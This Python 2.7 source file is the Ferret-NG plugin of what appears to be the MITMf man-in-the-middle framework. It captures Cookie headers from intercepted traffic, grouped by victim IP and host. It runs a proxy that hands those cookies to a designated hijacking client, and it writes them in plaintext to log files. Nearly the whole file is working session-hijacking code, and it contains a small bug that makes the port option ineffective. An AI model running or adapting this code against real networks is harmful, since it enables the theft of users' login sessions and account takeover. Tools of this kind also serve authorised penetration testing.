#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging
import ast
import sys

from datetime import datetime
from plugins.plugin import Plugin
from twisted.internet import reactor
from twisted.web import http
from twisted.internet import reactor
from core.utils import shutdown
from core.ferretng.FerretProxy import FerretProxy
from core.ferretng.URLMonitor import URLMonitor

mitmf_logger = logging.getLogger("mitmf")

class FerretNG(Plugin):
	name        = "Ferret-NG"
	optname     = "ferretng"
	desc        = "Captures cookies and starts a proxy that will feed them to connected clients"
	version     = "0.1"
	has_opts    = True

	def initialize(self, options):
		'''Called if plugin is enabled, passed the options namespace'''
		self.options = options
		self.ferret_port = 10010 or options.ferret_port
		self.cookie_file = None

		URLMonitor.getInstance().hijack_client = self.config['Ferret-NG']['Client']

		if options.cookie_file:
			self.tree_info.append('Loading cookies from log file')
			try:
				with open(options.cookie_file, 'r') as cookie_file:
					self.cookie_file = ast.literal_eval(cookie_file.read())
					URLMonitor.getInstance().cookies = self.cookie_file
					cookie_file.close()
			except Exception as e:
				shutdown("[-] Error loading cookie log file: {}".format(e))

		self.tree_info.append("Listening on port {}".format(self.ferret_port))

	def onConfigChange(self):
		mitmf_logger.info("[Ferret-NG] Will now hijack captured sessions from {}".format(self.config['Ferret-NG']['Client']))
		URLMonitor.getInstance().hijack_client = self.config['Ferret-NG']['Client']

	def clientRequest(self, request):
		if 'cookie' in request.headers:
			host   = request.headers['host']
			cookie = request.headers['cookie']
			client = request.client.getClientIP()

			if client not in URLMonitor.getInstance().cookies:
				URLMonitor.getInstance().cookies[client] = []

			for entry in URLMonitor.getInstance().cookies[client]:
				if host == entry['host']:
					mitmf_logger.debug("{} [Ferret-NG] Updating captured session for {}".format(client, host))
					entry['host']   = host
					entry['cookie'] = cookie
					return

			mitmf_logger.info("{} [Ferret-NG] Host: {} Captured cookie: {}".format(client, host, cookie))
			URLMonitor.getInstance().cookies[client].append({'host': host, 'cookie': cookie})

	def pluginReactor(self, StrippingProxy):
		FerretFactory = http.HTTPFactory(timeout=10)
		FerretFactory.protocol = FerretProxy
		reactor.listenTCP(self.ferret_port, FerretFactory)

	def pluginOptions(self, options):
		options.add_argument('--port', dest='ferret_port', metavar='PORT', type=int, default=None, help='Port to start Ferret-NG proxy on (default 10010)')
		options.add_argument('--load-cookies', dest='cookie_file', metavar='FILE', type=str, default=None, help='Load cookies from a log file')

	def finish(self):
		if not URLMonitor.getInstance().cookies:
			return 

		if self.cookie_file == URLMonitor.getInstance().cookies:
			return
		
		mitmf_logger.info("[Ferret-NG] Writing cookies to log file")
		with open('./logs/ferret-ng/cookies-{}.log'.format(datetime.now().strftime("%Y-%m-%d_%H:%M:%S:%s")), 'w') as cookie_file:
			cookie_file.write(str(URLMonitor.getInstance().cookies))
			cookie_file.close()
